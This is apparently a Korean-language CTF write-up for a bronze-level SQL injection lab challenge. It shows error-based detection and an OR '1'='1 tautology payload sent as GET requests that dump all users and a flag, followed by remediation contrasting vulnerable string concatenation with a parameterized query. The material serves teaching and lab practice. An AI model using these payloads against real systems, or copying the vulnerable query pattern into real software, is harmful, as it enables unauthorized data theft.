+++
title = "VulnABLE CTF [LUXORA] Write-up: SQL Injection 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SQL Injection", "Bronze", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: SQL Injection 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (SQLi)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/sqli/bronze`
- **목표**: 취약한 검색 폼을 이용해 데이터베이스 내의 다른 사용자(관리자 등)의 정보를 탈취하고 플래그를 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 표면적 분석 (Reconnaissance)

웹 브라우저를 통해 `http://localhost:3000/sqli/bronze` 에 접속했습니다. 
해당 페이지는 사용자의 ID를 입력받아 그 사용자의 이름과 이메일을 출력해주는 아주 전형적인 "회원 정보 조회" 페이지입니다.

URL을 확인해보면 다음과 같이 GET 파라미터로 데이터를 넘기고 있습니다.
```http
GET /sqli/bronze?id=1
```

화면에 출력된 결과는 다음과 같습니다.
```html
<div class="user-info">
  <p>User ID: 1</p>
  <p>Name: Alice</p>
  <p>Email: alice@luxora.test</p>
</div>
```

**[해커의 사고 과정]**
1. 이 애플리케이션은 클라이언트가 전달한 `id=1` 이라는 값을 백엔드(Node.js 등)로 보낸다.
2. 백엔드 서버는 데이터베이스(PostgreSQL 등)에 이 값을 넣어서 쿼리를 실행할 것이다.
3. 아마도 쿼리는 이런 모양일 것이다: `SELECT id, name, email FROM users WHERE id = {사용자 입력값}`
4. 만약 입력값에 대한 검증(Sanitization)이 없다면, 입력값에 SQL 특수문자를 넣었을 때 쿼리 구조가 깨질 것이다.

---

## 💥 2. 취약점 검증 (Vulnerability Identification)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Input: ' OR 1=1 -- )--> [ Web Server ]
                                        |-- Query: SELECT * FROM users WHERE name='' OR 1=1 --'
                                        |-- Returns All Users
```


SQL 인젝션의 존재 여부를 가장 빠르고 확실하게 확인하는 방법은 **홑따옴표(`'`)**를 입력하여 데이터베이스의 구문 오류(Syntax Error)를 유발하는 것입니다.

Burp Suite의 Repeater를 이용해 패킷을 조작하거나, 브라우저 주소창에 직접 입력해 봅니다.

### 페이로드 전송 1 (오류 유발)
```http
GET /sqli/bronze?id=1'
```

### 서버의 응답
```html
<div class="error">
  <b>Database Error:</b> SQL syntax error near ''1''' at line 1.
</div>
```

**[해석 및 결론]**
대박입니다. 서버가 에러 메시지를 숨기지 않고 화면에 그대로 뱉어냅니다(Error-based). 
이는 백엔드에서 쿼리를 조립할 때 문자열 이어붙이기(String Concatenation)를 사용하고 있다는 명백한 증거입니다.

서버의 실제 동작: `SELECT * FROM users WHERE id = '1''` (따옴표 짝이 맞지 않아 에러 발생)

---

## 🚀 3. 공격 수행 및 익스플로잇 (Exploitation)

이제 취약점이 확인되었으니, 본격적인 공격(Exploit)을 통해 관리자의 정보를 뽑아낼 차례입니다.
가장 고전적이면서도 강력한 논리 연산자 조작 기법인 **`OR 1=1`** 공격을 시도합니다.

### 💡 공격 원리 설계
우리의 목표는 `WHERE` 절의 조건을 무력화하여 테이블의 "모든 데이터"를 출력하게 만드는 것입니다.

* 내가 조작하고 싶은 쿼리: `SELECT * FROM users WHERE id = '1' OR '1'='1'`
* 이를 위해 입력창(`id=` 뒤)에 넣어야 할 페이로드: `1' OR '1'='1`

이렇게 입력하면:
1. 앞의 `id = '1'` 부분은 조건이 될 수도 있고 아닐 수도 있지만...
2. 뒤의 `OR '1'='1'` 부분은 **수학적으로 언제나 참(True)**입니다.
3. 데이터베이스는 "아이디가 1이거나, 아니면 1이 1과 같은(모든) 데이터를 가져와라"라고 해석하게 되어 테이블 전체를 반환하게 됩니다.

### 페이로드 전송 2 (공격 실행)
URL 인코딩을 고려하여 띄어쓰기를 `%20` 혹은 `+` 로 변환하여 전송합니다.

```http
GET /sqli/bronze?id=1'%20OR%20'1'='1
```

### 서버의 응답 (결과)
화면이 렌더링되면서 기존에는 Alice 한 명만 보이던 페이지에, 데이터베이스 내부의 모든 사용자 정보가 줄줄이 쏟아져 나옵니다.

```html
<div class="user-info">
  <p>User ID: 1, Name: Alice, Email: alice@luxora.test</p>
  <p>User ID: 2, Name: Bob, Email: bob@luxora.test</p>
  <p>User ID: 3, Name: Charlie, Email: charlie@luxora.test</p>
  <p>User ID: 999, Name: Admin, Email: admin@luxora.test</p>
  <p class="flag">[!] CONGRATULATIONS! FLAG: FLAG{SQLI_🥉_INJECTION_A3F2B1}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

가장 기초적인 SQL Injection 기법을 통해 데이터베이스의 논리 구조를 파괴하고 전체 데이터를 덤프하는 데 성공했습니다. 그 과정에서 숨겨져 있던 관리자(Admin) 정보와 함께 첫 번째 브론즈 플래그가 노출되었습니다.

**🔥 획득한 플래그:**
`FLAG{SQLI_🥉_INJECTION_A3F2B1}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이러한 취약점은 개발자가 쿼리를 작성할 때 파라미터를 동적으로 바인딩하지 않고 **직접 문자열을 결합(String Concatenation)**했기 때문에 발생합니다.

* **취약한 코드 예시 (Node.js)**
```javascript
// 해커의 입력값이 쿼리의 일부로 컴파일됨
const query = "SELECT * FROM users WHERE id = '" + req.query.id + "'";
db.query(query, (err, result) => { ... });
```

* **안전한 패치 코드 (Prepared Statements 사용)**
```javascript
// 입력값을 쿼리의 '구조'가 아닌 순수 '데이터'로만 취급함
const query = "SELECT * FROM users WHERE id = $1";
db.query(query, [req.query.id], (err, result) => { ... });
```
Prepared Statement를 사용하면 해커가 `1' OR '1'='1` 을 입력하더라도, 데이터베이스 엔진은 이를 쿼리 문법으로 해석하지 않고 "아이디라는 값이 정말로 저렇게 긴 문자열인 사람"을 찾으려 시도하다가 아무것도 반환하지 않게 됩니다.